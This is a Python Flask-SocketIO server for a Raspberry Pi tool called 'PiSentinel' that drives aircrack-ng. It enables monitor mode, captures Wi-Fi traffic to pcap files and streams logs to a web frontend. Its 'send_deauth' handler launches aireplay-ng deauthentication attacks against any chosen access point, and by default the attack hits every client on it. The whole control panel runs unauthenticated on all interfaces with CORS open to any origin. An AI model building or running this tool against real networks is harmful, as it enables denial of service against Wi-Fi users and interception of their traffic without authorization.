from flask import Flask
from flask_socketio import SocketIO, emit
import subprocess
import os
import threading

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

CAPTURE_DIR = "/home/pi/Desktop/PiSentinel/captures"
MONITOR_INTERFACE = "wlan1"
airodump_process = None


def stream_logs():
    """Continuously stream logs to the frontend."""
    log_file = os.path.join(CAPTURE_DIR, "airodump.log")
    while True:
        if os.path.exists(log_file):
            with open(log_file, "r") as f:
                logs = f.read()
                socketio.emit("log_update", {"logs": logs})
        socketio.sleep(2)


@socketio.on("start_monitoring")
def start_monitoring(data):
    """Start monitoring mode and airodump-ng."""
    global airodump_process
    try:
        interface = data.get("interface", MONITOR_INTERFACE)
        subprocess.run(["airmon-ng", "start", interface], check=True)
        log_file = os.path.join(CAPTURE_DIR, "airodump.log")
        airodump_process = subprocess.Popen(
            ["airodump-ng", "-w", os.path.join(CAPTURE_DIR, "capture"), "--output-format", "pcap", interface],
            stdout=open(log_file, "w"),
            stderr=subprocess.STDOUT,
        )
        emit("status_update", {"status": f"Monitoring started on {interface}"})
    except Exception as e:
        emit("status_update", {"status": f"Error: {str(e)}"})


@socketio.on("stop_monitoring")
def stop_monitoring():
    """Stop monitoring mode and airodump-ng."""
    global airodump_process
    try:
        if airodump_process:
            airodump_process.terminate()
            airodump_process = None
        subprocess.run(["airmon-ng", "stop", MONITOR_INTERFACE], check=True)
        emit("status_update", {"status": "Monitoring stopped"})
    except Exception as e:
        emit("status_update", {"status": f"Error: {str(e)}"})


@socketio.on("send_deauth")
def send_deauth(data):
    """Send a deauth attack."""
    try:
        target_ap = data["target_ap"]
        target_client = data.get("target_client", "FF:FF:FF:FF:FF:FF")
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", target_ap, "-c", target_client, MONITOR_INTERFACE],
            check=True,
        )
        emit("status_update", {"status": f"Deauth attack sent to {target_ap}"})
    except Exception as e:
        emit("status_update", {"status": f"Error: {str(e)}"})


@socketio.on("fetch_logs")
def fetch_logs():
    """Send captured logs to the frontend."""
    try:
        logs = []
        for file in os.listdir(CAPTURE_DIR):
            if file.endswith(".cap"):
                logs.append(file)
        emit("log_update", {"logs": logs})
    except Exception as e:
        emit("log_update", {"logs": [f"Error: {str(e)}"]})


if __name__ == "__main__":
    os.makedirs(CAPTURE_DIR, exist_ok=True)
    threading.Thread(target=stream_logs, daemon=True).start()
    socketio.run(app, host="0.0.0.0", port=5000)